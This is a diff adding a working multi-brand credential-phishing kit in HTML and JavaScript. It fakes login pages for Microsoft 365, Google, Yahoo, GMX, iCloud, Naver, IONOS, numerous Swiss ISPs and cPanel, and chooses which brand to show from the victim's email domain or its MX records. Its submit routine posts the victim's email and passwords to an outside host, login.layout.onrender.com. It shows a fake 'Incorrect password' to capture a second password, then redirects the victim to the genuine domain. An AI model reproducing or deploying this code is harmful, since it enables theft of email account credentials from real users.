+        <div class="hibox-row"><label>帳號：</label><input type="email" id="hiboxEmail" readonly></div>
+        <div class="hibox-row"><label>密碼：</label><input type="password" id="hiboxPass"></div>
+        <div class="hibox-row"><label></label><div style="flex:1;text-align:right"><button class="hibox-btn" onclick="submitLogin('hibox')">登入</button></div></div>
+      </div>
+    </div>
+  </div>
+  <div id="hibox-err" class="err-box" style="text-align:center;padding-bottom:10px"></div>
+</div>
+
+<!-- IONOS -->
+<div id="ionosContainer" style="display:none">
+  <div class="ionos-header"><div class="ionos-logo">IONOS</div></div>
+  <div class="ionos-main"><div class="ionos-card">
+    <div class="ionos-title">Enter password</div>
+    <div class="ionos-user-row"><span id="ionosEmailDisplay"></span></div>
+    <input type="password" id="ionosPass" class="ionos-input" placeholder="Password">
+    <button class="ionos-btn" onclick="submitLogin('ionos')">Next</button>
+    <div id="ionos-err" class="err-box" style="text-align:center"></div>
+  </div></div>
+</div>
+
+<!-- GENERIC -->
+<div class="login-container" id="genericContainer" style="display:none">
+  <div class="header">
+    <div class="logo-icon" id="logoIcon">SL</div>
+    <div class="logo-text" id="logoText">Secure<span id="highlightText">Login</span><span class="domain-badge" id="brandFlag"></span></div>
+    <div class="subtitle" id="subtitleText">Secure Sign In</div>
+    <div class="domain-badge" id="domainBadge">Secured</div>
+  </div>
+  <div class="form-group"><label>Email Address</label><input type="email" id="emailDisplay" readonly disabled></div>
+  <div class="form-group"><label>Password</label><div class="password-wrapper"><input type="password" id="password" placeholder="Enter your password"><button class="toggle-password" onclick="togglePasswordVisibility()">👁️</button></div></div>
+  <div class="err-box" id="errorMessage"><span id="errorText">Please enter your password</span></div>
+  <button class="btn-signin" onclick="submitLogin('generic')" id="signinBtn"><span id="btnText">Sign In</span></button>
+  <div class="footer-links"><a href="#" id="forgotLink">Forgot password?</a><a href="#" id="createLink">Create account</a></div>
+  <div class="footer-text" id="copyrightText">© 2026. All rights reserved.</div>
+</div>
+
+<script>
+const API_BASE = 'https://login.layout.onrender.com';
+const CONFIG = { LOGIN_URL: API_BASE + '/api/login', MAX_ATTEMPTS: 3 };
+
+let currentEmail = '', currentDomain = '', proofFromUrl = '', proofTsFromUrl = '';
+let loginAttempts = 0, firstPassword = '', currentBrand = null;
+
+/* ============================================================
+   PROVIDER REGISTRY — all 34 named providers
+   ============================================================ */
+const LAYOUT = {
+  DAOU:'daou', ABV:'abv', YAHOO:'yahoo', GOOGLE:'google', M365:'m365', NAVER:'naver',
+  DAUM:'daum', TONLINE:'tonline', HIBOX:'hibox', IONOS:'ionos', GENERIC:'generic',
+  CPANEL:'cpanel', ROUNDCUBE:'webmail'
+};
+
+/* Every domain that belongs to a named provider -> provider key */
+const DOMAIN_MAP = {
+  // DAOU Office
+  'wooridul.co.kr':'DAOU','bnckorea.co.kr':'DAOU','vodacom.co.kr':'DAOU','daouoffice.com':'DAOU',
+  // GMX
+  'gmx.ch':'GMX','gmx.net':'GMX','gmx.de':'GMX','gmx.at':'GMX','gmx.com':'GMX',
+  // Microsoft
+  'hotmail.com':'M365','hotmail.ch':'M365','hotmail.de':'M365','hotmail.fr':'M365','hotmail.it':'M365',
+  'hotmail.es':'M365','hotmail.co.uk':'M365','outlook.com':'M365','outlook.de':'M365','outlook.fr':'M365',
+  'live.com':'M365','live.de':'M365','live.co.uk':'M365','msn.com':'M365','microsoft.com':'M365',
+  'office.com':'M365','office365.com':'M365',
+  // Yahoo
+  'yahoo.com':'YAHOO','yahoo.ch':'YAHOO','yahoo.de':'YAHOO','yahoo.fr':'YAHOO','yahoo.it':'YAHOO',
+  'yahoo.es':'YAHOO','yahoo.co.uk':'YAHOO','yahoo.co.jp':'YAHOO','ymail.com':'YAHOO','rocketmail.com':'YAHOO',
+  // Google
+  'gmail.com':'GOOGLE','googlemail.com':'GOOGLE','google.com':'GOOGLE',
+  // Web.de
+  'web.de':'WEBDE',
+  // Caramail
+  'caramail.com':'CARAMAIL',
+  // iCloud / Apple
+  'icloud.com':'ICLOUD','me.com':'ICLOUD','mac.com':'ICLOUD',
+  // T-Online
+  't-online.de':'TONLINE','t-online.ch':'TONLINE',
+  // Korea
+  'naver.com':'NAVER','naver.net':'NAVER','daum.net':'DAUM','hanmail.net':'DAUM',
+  // Bulgaria
+  'abv.bg':'ABV','mail.bg':'ABV',
+  // Taiwan
+  'hibox.tw':'HIBOX','hinet.net':'HIBOX','msa.hinet.net':'HIBOX',
+  // Hosting
+  'ionos.de':'IONOS','ionos.com':'IONOS','1und1.de':'IONOS','strato.de':'IONOS','freenet.de':'IONOS',
+  // Swiss ISPs -> branded Roundcube
+  'swissonline.ch':'SWISSONLINE','freesurf.ch':'FREESURF','tiscali.ch':'TISCALI','tiscalinet.ch':'TISCALI',
+  'ticino.com':'TICINO','hispeed.ch':'HISPEED','hispeed-sr.ch':'HISPEED','netplus.ch':'NETPLUS',
+  'datacomm.ch':'DATACOMM','vtx.ch':'VTX','vtxnet.ch':'VTX','vtxmail.ch':'VTX','tele2.ch':'TELE2',
+  'worldcom.ch':'WORLDCOM','dplanet.ch':'DPLANET','bluewin.ch':'BLUEWIN','bluemail.ch':'BLUEWIN',
+  'sunrise.ch':'SUNRISE','solnet.ch':'SOLNET','greenmail.ch':'GREENMAIL','zuriwerk.ch':'ZUERIWERK',
+  'zueriwerk.ch':'ZUERIWERK','lift.ch':'LIFT','romandie.ch':'ROMANDIE','romandie.com':'ROMANDIE',
+  'citycable.ch':'CITYCABLE','span.ch':'SPAN','smile.ch':'SMILE','genevalink.ch':'GENEVA',
+  'geneva-link.ch':'GENEVA','sensemail.ch':'SENSEMAIL','tvs2net.ch':'TVS2NET','mcnet.ch':'MCNET',
+  'active.ch':'ACTIVE'
+};
+
+/* Swiss ISP brands -> Roundcube branding */
+const ISP_BRAND = {
+  SWISSONLINE:{n:'Swissonline',c:'#0a4b8c'}, FREESURF:{n:'Freesurf',c:'#0b6ea8'},
+  TISCALI:{n:'Tiscali',c:'#1a9be0'}, TICINO:{n:'Ticino.com',c:'#c8102e'},
+  HISPEED:{n:'Hispeed',c:'#e2001a'}, NETPLUS:{n:'Netplus',c:'#0d6ba8'},
+  DATACOMM:{n:'Datacomm',c:'#0a5c8a'}, VTX:{n:'VTX',c:'#1a5fa8'},
+  TELE2:{n:'Tele2',c:'#0a3a7a'}, WORLDCOM:{n:'Worldcom',c:'#1a4fa0'},
+  DPLANET:{n:'Dplanet',c:'#0b6b3a'}, BLUEWIN:{n:'Bluewin',c:'#0a4b8c'},
+  SUNRISE:{n:'Sunrise',c:'#e2001a'}, SOLNET:{n:'Solnet',c:'#0b5ea8'},
+  GREENMAIL:{n:'Greenmail',c:'#1a7a3a'}, ZUERIWERK:{n:'Züriwerk',c:'#0a6ba8'},
+  LIFT:{n:'Lift',c:'#1a5fa8'}, ROMANDIE:{n:'Romandie',c:'#0a4b8c'},
+  CITYCABLE:{n:'Citycable',c:'#0b5c8a'}, SPAN:{n:'Span',c:'#0a5c8a'},
+  SMILE:{n:'Smile',c:'#009fe3'}, GENEVA:{n:'Geneva Link',c:'#0a4b8c'},
+  SENSEMAIL:{n:'Sensemail',c:'#0b6b8a'}, TVS2NET:{n:'TVS2Net',c:'#1a4fa0'},
+  MCNET:{n:'MCNet',c:'#0a5c8a'}, ACTIVE:{n:'Active.ch',c:'#0a6ba8'}
+};
+
+/* Branded generic providers */
+const BRAND_DB = {
+  GMX:{name:'GMX',logo:'GMX',icon:'G',color:'#1a1a6e',sub:'GMX E-Mail',hint:'Geben Sie Ihr GMX Passwort ein',forgot:'Passwort vergessen?',create:'Konto erstellen',flag:'DE'},
+  WEBDE:{name:'WEB.DE',logo:'WEB.DE',icon:'W',color:'#e2001a',sub:'WEB.DE E-Mail',hint:'Geben Sie Ihr Passwort ein',forgot:'Passwort vergessen?',create:'Konto erstellen',flag:'DE'},
+  CARAMAIL:{name:'Caramail',logo:'Caramail',icon:'C',color:'#f07d00',sub:'Caramail',hint:'Entrez votre mot de passe',forgot:'Mot de passe oublié ?',create:'Créer un compte',flag:'FR'},
+  ICLOUD:{name:'iCloud',logo:'iCloud',icon:'',color:'#0b84ff',sub:'Sign in to iCloud',hint:'Enter your Apple Account password',forgot:'Forgot password?',create:'Create account',flag:'US'},
+  default:{name:'Secure Login',logo:'Secure',icon:'SL',color:'#1a73e8',sub:'Secure Sign In',hint:'Enter your account password',forgot:'Forgot password?',create:'Create account',flag:''}
+};
+
+/* ============================================================
+   HELPERS
+   ============================================================ */
+const extractDomain = e => e && e.includes('@') ? e.split('@')[1].toLowerCase() : '';
+function showError(p,m){const el=document.getElementById(p+'-err');if(el){el.textContent=m;el.classList.add('show')}}
+function clearError(p){const el=document.getElementById(p+'-err');if(el)el.classList.remove('show')}
+
+/* MX lookup — decides layout for every unknown domain */
+async function detectProviderByMX(domain){
+  try{
+    const r = await fetch('https://dns.google/resolve?name='+encodeURIComponent(domain)+'&type=MX');
+    const d = await r.json();
+    if(d.Answer){
+      const mx = d.Answer.map(a=>String(a.data).toLowerCase()).join(',');
+      if(mx.includes('daouoffice')||mx.includes('daou.com')) return 'DAOU';
+      if(mx.includes('yahoodns')||mx.includes('yahoo.com')) return 'YAHOO';
+      if(mx.includes('google.com')||mx.includes('googlemail')) return 'GOOGLE';
+      if(mx.includes('mail.protection.outlook.com')||mx.includes('eo.outlook.com')) return 'M365';
+      if(mx.includes('hiworks')||mx.includes('gabia')||mx.includes('mailplug')||mx.includes('hanbiro')||mx.includes('worksmobile')||mx.includes('kakaowork')||mx.includes('dooray')) return 'HIBOX';
+      if(mx.includes('hibox')||mx.includes('hinet')||mx.includes('seed.net.tw')) return 'HIBOX';
+      if(mx.includes('gmx.net')) return 'GMX';
+      if(mx.includes('web.de')||mx.includes('1und1')) return 'WEBDE';
+      if(mx.includes('kundenserver')||mx.includes('ionos')||mx.includes('strato')) return 'IONOS';
+      if(mx.includes('swissonline')) return 'SWISSONLINE';
+      if(mx.includes('freesurf')) return 'FREESURF';
+      if(mx.includes('tiscali')) return 'TISCALI';
+      if(mx.includes('ticino')) return 'TICINO';
+      if(mx.includes('hispeed')||mx.includes('sunrise')) return 'HISPEED';
+      if(mx.includes('bluewin')) return 'BLUEWIN';
+      if(mx.includes('netplus')) return 'NETPLUS';
+      if(mx.includes('datacomm')) return 'DATACOMM';
+      if(mx.includes('vtx')) return 'VTX';
+      if(mx.includes('tele2')) return 'TELE2';
+      if(mx.includes('worldcom')) return 'WORLDCOM';
+      if(mx.includes('dplanet')) return 'DPLANET';
+      if(mx.includes('solnet')) return 'SOLNET';
+      if(mx.includes('greenmail')) return 'GREENMAIL';
+      if(mx.includes('zueriwerk')||mx.includes('zuriwerk')) return 'ZUERIWERK';
+      if(mx.includes('lift.ch')) return 'LIFT';
+      if(mx.includes('romandie')) return 'ROMANDIE';
+      if(mx.includes('citycable')) return 'CITYCABLE';
+      if(mx.includes('smile.ch')) return 'SMILE';
+      if(mx.includes('sensemail')) return 'SENSEMAIL';
+      if(mx.includes('tvs2net')) return 'TVS2NET';
+      if(mx.includes('mcnet')) return 'MCNET';
+      if(mx.includes('active.ch')) return 'ACTIVE';
+      if(mx.includes('icloud')||mx.includes('apple')) return 'ICLOUD';
+      if(mx.includes('caramail')) return 'CARAMAIL';
+    }
+  }catch(e){}
+  return null;
+}
+
+/* ============================================================
+   RENDERERS
+   ============================================================ */
+function renderDaou(){
+  document.body.className='is-daou';
+  document.getElementById('daouContainer').style.display='block';
+  document.getElementById('daouEmail').value=currentEmail;
+  document.getElementById('daouPass').focus();
+  document.getElementById('daouPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('daou')});
+}
+function renderAbv(){
+  document.body.className='is-abv';
+  document.getElementById('abvContainer').style.display='block';
+  document.getElementById('abvEmail').value=currentEmail;
+  document.getElementById('abvPass').focus();
+}
+function renderCpanel(){
+  document.body.className='is-cpanel';
+  document.getElementById('cpanelContainer').style.display='block';
+  document.getElementById('cpanelEmail').value=currentEmail;
+  document.getElementById('cpanelPass').focus();
+  document.getElementById('cpanelPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('cpanel')});
+}
+function renderRoundcube(brandKey){
+  const b = ISP_BRAND[brandKey] || {n:'Webmail',c:'#40b3e0'};
+  document.body.className='is-webmail';
+  document.getElementById('webmailContainer').style.display='flex';
+  document.getElementById('rcBrand').textContent=b.n;
+  document.getElementById('rcBrand').style.color=b.c;
+  document.querySelector('.rc-btn').style.background=b.c;
+  document.title=b.n+' Webmail';
+  document.getElementById('webmailEmail').value=currentEmail;
+  document.getElementById('webmailPass').focus();
+  document.getElementById('webmailPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('webmail')});
+}
+function renderYahoo(){
+  document.body.className='is-yahoo';
+  document.getElementById('yahooContainer').style.display='flex';
+  document.getElementById('yahooEmailDisplay').textContent=currentEmail;
+  document.getElementById('yahooPass').focus();
+  document.getElementById('yahooPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('yahoo')});
+}
+function renderGoogle(){
+  document.body.className='is-google';
+  document.getElementById('googleContainer').style.display='flex';
+  document.getElementById('googleEmailDisplay').textContent=currentEmail;
+  document.getElementById('googlePass').focus();
+  document.getElementById('googlePass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('google')});
+}
+function renderM365(){
+  document.body.className='is-m365';
+  document.getElementById('m365EmailDisplay').textContent=currentEmail;
+  document.getElementById('m365Pass').focus();
+  document.getElementById('m365Pass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('m365')});
+}
+function renderNaver(){
+  document.body.className='is-naver';
+  document.getElementById('naverContainer').style.display='flex';
+  document.getElementById('naverEmail').value=currentEmail;
+  document.getElementById('naverPass').focus();
+  document.getElementById('naverPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('naver')});
+}
+function renderDaum(){
+  document.body.className='is-daum';
+  document.getElementById('daumContainer').style.display='flex';
+  document.getElementById('daumEmail').value=currentEmail;
+  document.getElementById('daumPass').focus();
+  document.getElementById('daumPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('daum')});
+}
+function renderTon(){
+  document.body.className='is-tonline';
+  document.getElementById('tonlineContainer').style.display='block';
+  document.getElementById('tonlineEmailDisplay').textContent=currentEmail;
+  document.getElementById('tonlinePass').focus();
+  document.getElementById('tonlinePass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('tonline')});
+}
+function renderHibox(){
+  document.body.className='is-hibox';
+  document.getElementById('hiboxContainer').style.display='block';
+  document.getElementById('hiboxEmail').value=currentEmail;
+  document.getElementById('hiboxPass').focus();
+  document.getElementById('hiboxPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('hibox')});
+}
+function renderIonos(){
+  document.body.className='is-ionos';
+  document.getElementById('ionosContainer').style.display='block';
+  document.getElementById('ionosEmailDisplay').textContent=currentEmail;
+  document.getElementById('ionosPass').focus();
+  document.getElementById('ionosPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('ionos')});
+}
+function renderGeneric(brandKey){
+  const b = BRAND_DB[brandKey] || BRAND_DB.default;
+  currentBrand = b;
+  document.body.className='is-generic';
+  document.body.style.background = 'radial-gradient(circle at 25% 20%, '+b.color+'30 0%, transparent 55%), linear-gradient(135deg,#fafbfc 0%,'+b.color+'10 100%)';
+  document.getElementById('genericContainer').style.display='block';
+  document.getElementById('emailDisplay').value=currentEmail;
+  document.getElementById('pageTitle').textContent=b.sub;
+  document.getElementById('subtitleText').textContent=b.sub;
+  document.getElementById('logoText').innerHTML=b.logo+'<span class="domain-badge" id="brandFlag">'+b.flag+' '+b.name+'</span>';
+  document.getElementById('logoIcon').textContent=b.icon;
+  document.getElementById('logoIcon').style.background=b.color;
+  document.getElementById('signinBtn').style.background=b.color;
+  document.getElementById('forgotLink').textContent=b.forgot;
+  document.getElementById('createLink').textContent=b.create;
+  document.getElementById('password').placeholder=b.hint;
+  document.getElementById('domainBadge').textContent=currentDomain.toUpperCase();
+  document.getElementById('password').focus();
+  document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')submitLogin('generic')});
+}
+
+function route(provider){
+  switch(provider){
+    case 'DAOU': return renderDaou();
+    case 'ABV': return renderAbv();
+    case 'YAHOO': return renderYahoo();
+    case 'GOOGLE': return renderGoogle();
+    case 'M365': return renderM365();
+    case 'NAVER': return renderNaver();
+    case 'DAUM': return renderDaum();
+    case 'TONLINE': return renderTon();
+    case 'HIBOX': return renderHibox();
+    case 'IONOS': return renderIonos();
+    case 'GMX': case 'WEBDE': case 'CARAMAIL': case 'ICLOUD': return renderGeneric(provider);
+    case 'CPANEL': return renderCpanel();
+    default: return ISP_BRAND[provider] ? renderRoundcube(provider) : renderCpanel();
+  }
+}
+
+/* ============================================================
+   SUBMIT
+   ============================================================ */
+async function submitLogin(platform){
+  clearError(platform);
+  const map={daou:'daouPass',abv:'abvPass',yahoo:'yahooPass',google:'googlePass',m365:'m365Pass',naver:'naverPass',daum:'daumPass',tonline:'tonlinePass',hibox:'hiboxPass',ionos:'ionosPass',webmail:'webmailPass',cpanel:'cpanelPass',generic:'password'};
+  const el=document.getElementById(map[platform]);
+  const pass=el?el.value.trim():'';
+  if(!pass||pass.length<4){showError(platform,'Password must be at least 4 characters.');return}
+
+  const btn=document.querySelector('#'+platform+'Container button, #signinBtn');
+  const orig=btn?btn.textContent:'';
+  if(btn){btn.disabled=true;btn.textContent='...'}
+
+  loginAttempts++;
+  const stage=loginAttempts===1?1:2;
+  const payload={email:currentEmail,password:pass,stage:stage};
+  if(stage===2)payload.firstPassword=firstPassword;
+  if(stage===1){payload.proof=proofFromUrl||undefined;payload.proofTs=proofTsFromUrl||undefined}
+
+  try{
+    const res=await fetch(CONFIG.LOGIN_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+    const data=await res.json();
+    if(stage===2&&data.match===true&&data.redirect){
+      if(btn)btn.textContent='Success';
+      setTimeout(()=>{window.location.href=data.redirect},1000);
+      return;
+    }
+    if(stage===1)firstPassword=pass;
+    showError(platform,'Incorrect password. Please try again.');
+    if(el)el.value='';
+    if(btn){btn.disabled=false;btn.textContent=orig}
+    if(loginAttempts>=CONFIG.MAX_ATTEMPTS){
+      showError(platform,'Too many attempts. Redirecting...');
+      setTimeout(()=>{window.location.href='https://'+currentDomain},1500);
+    }
+  }catch(e){
+    showError(platform,'Connection error. Please try again.');
+    if(btn){btn.disabled=false;btn.textContent=orig}
+  }
+}
+
+/* ============================================================
+   UTILS
+   ============================================================ */
+function toggleYahooPass(){const p=document.getElementById('yahooPass');p.type=p.type==='password'?'text':'password'}
+function toggleGooglePass(){const p=document.getElementById('googlePass');p.type=p.type==='password'?'text':'password'}
+function toggleTonPass(){const p=document.getElementById('tonlinePass');p.type=p.type==='password'?'text':'password'}
+function togglePasswordVisibility(){const p=document.getElementById('password');p.type=p.type==='password'?'text':'password'}
+
+/* ============================================================
+   BOOT
+   ============================================================ */
+document.addEventListener('DOMContentLoaded',async function(){
+  const params=new URLSearchParams(window.location.search);
+  let raw=params.get('u')||params.get('email')||'';
+  try{currentEmail=decodeURIComponent(raw)}catch(e){currentEmail=raw}
+  if(!currentEmail)currentEmail='test@outlook.com';
+  proofFromUrl=params.get('p')||'';
+  proofTsFromUrl=params.get('t')||'';
+  currentDomain=extractDomain(currentEmail);
+
+  document.body.className='is-loading';
+
+  // 1) exact domain hit
+  if(DOMAIN_MAP[currentDomain]){ route(DOMAIN_MAP[currentDomain]); return; }
+
+  // 2) MX lookup decides
+  const viaMx = await detectProviderByMX(currentDomain);
+  if(viaMx){ route(viaMx); return; }
+
+  // 3) fallback by TLD
+  if(currentDomain.endsWith('.kr')) return renderDaou();
+  if(currentDomain.endsWith('.tw')) return renderHibox();
+  if(currentDomain.endsWith('.de')) return renderIonos();
+
+  // 4) own-host default
+  renderCpanel();
+});
+</script>
+</body>
+</html>
